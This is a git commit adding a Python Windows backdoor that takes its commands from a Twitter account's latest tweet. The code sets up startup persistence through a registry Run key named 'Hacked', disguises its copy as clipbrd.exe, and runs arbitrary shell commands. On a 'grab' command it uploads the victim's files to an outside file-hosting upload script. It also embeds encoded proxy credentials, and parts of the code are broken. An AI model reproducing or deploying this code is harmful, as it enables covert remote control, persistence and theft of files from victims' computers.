3722db83a2b596f8d94271fb172e8b31b3211b43
LuD1161 <aseemshrey@gmail.com>
2016-11-30 13:29:53 +0530

    Added Initialize method , which initializes persistence and gathers system details , also will set the bot name for file uploading
    Added uploading to file hosting services , using the php upload.php

---
+++ http_client_twitter.py
@@ -0,0 +1,97 @@
+import base64
+import requests
+import subprocess
+import time
+import os
+import shutil
+import _winreg as wreg
+import random
+from bs4 import BeautifulSoup
+
+url = "http://twitter.com/thekiranbedi"
+tweetNumberFromTopRecent = 0        # the topmost tweet
+
+
+def commandFromTwitter(url):
+    response = requests.get(url=url, proxies={
+        'http': "http://" + base64.b64decode(u) + ":" + base64.b64decode(p) + "@172.31.1.6:8080"})
+    soup = BeautifulSoup(response.text, 'html.parser')
+    # For parsing the first tweet
+    command = soup.find_all("p", {"class": "js-tweet-text"})[tweetNumberFromTopRecent].contents[0]
+    return command
+
+
+def persistence():
+    path = os.getcwd().strip('\n')  # get the current working directory
+    Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')  # Get userprofile
+
+    # Place where you wish your backdoor to be copied , here it is C:\Users\<UserName>\Documents
+    destination = userprof.strip('\n\r') + '\\Documents' + '\clipbrd.exe'
+
+    if not os.path.exists(destination):
+        shutil.copyfile(path + '\clipbrd.exe', destination)
+        # This is one of the keys that allows to run on startup , others can be found using
+        # sysinternals tools and other methods like googling
+        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",
+                           0, wreg.KEY_ALL_ACCESS)
+        # Hacked is the key name that will run our backdoor on startup
+        wreg.SetValueEx(key, 'Hacked', 0, wreg.REG_SZ, destination)
+        key.Close()
+
+
+def sendPost(Url, data, files=None):
+    token = "cml0MjAxNTA0NA==SWlpdGEwNDQ="
+    u, p = token.split('==')
+    u += "=="
+    response = requests.post(url=Url, data=data, proxies={
+        'http': "http://" + base64.b64decode(u) + ":" + base64.b64decode(p) + "@172.31.1.6:8080"})
+    return response
+
+
+def getSysDetails():
+    pass
+
+
+def initialize():
+    persistence()
+    getSysDetails()     # send sysDetails on initialisation and set hostname for identifying bot
+
+
+initialize()
+
+
+def connect():
+    while True:
+        command = commandFromTwitter(url)
+        print command
+
+        if 'terminate' in command:
+            return 1
+
+        elif 'grab' in command:
+            grab, path = command.split('*')
+            if os.path.exists(path):
+                newUrl = 'https://monohydric-variatio.000webhostapp.com/upload.php'
+                files = {'file': open(path, 'rb')}
+                r = sendPost(newUrl, files=files)
+            else:
+                r = sendPost(newUrl, data='[-]File Not Found')
+
+        else:
+            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
+                                   stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+            post_response = sendPost(url, CMD.stdout.read())
+            post_response = sendPost(url, CMD.stderr.read())
+
+        time.sleep(3)
+
+
+while True:
+    try:
+        if connect() == 1:
+            break  # 1 is the value against terminate command
+
+    except:
+        sleep_for = random.randrange(1, 10)
+        time.sleep(sleep_for)  # 1 - 10 seconds wait time
+        pass
